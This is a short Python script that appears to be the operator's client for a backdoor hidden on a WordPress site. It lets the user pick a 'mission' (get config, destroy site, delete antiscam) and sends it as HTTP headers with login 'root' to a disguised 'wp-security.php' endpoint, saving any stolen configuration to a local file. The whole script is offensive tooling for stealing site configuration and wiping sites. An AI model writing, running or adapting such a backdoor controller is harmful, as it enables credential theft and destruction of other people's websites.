from requests import post

missions_list=['1.Get config ', '2.Destroy site ', '3.Delete antiscam ']
cms_list=['1.WordPress ']
for i in missions_list:
	print(i)
mission_choice=int(input('Choose number: '))

# choosing mission
if mission_choice==1:
	mission='getconfig'
elif mission_choice==2:
	mission='destroy'
elif mission_choice==3:
	mission='delete'

for i in cms_list:
	print(i)

cms_choice=int(input('Choose number: '))
# choosing cms
if cms_choice==1:
	cms='wp'



def genheader(mission, cms):
	
	headers={
	'User-Agent':'suka_ibana',
	'login':'root',
	'cms':cms,
	'mission':mission,
	}
	return headers

headers=genheader(mission, cms)




r=post('http://anti-scam-wp/wp-security.php', headers=headers)
print(r.status_code)
print(r.text)
if mission_choice==1:
	getconfig=r.text
	with open('config.txt', 'w', encoding="utf-8") as f:
		f.write(getconfig)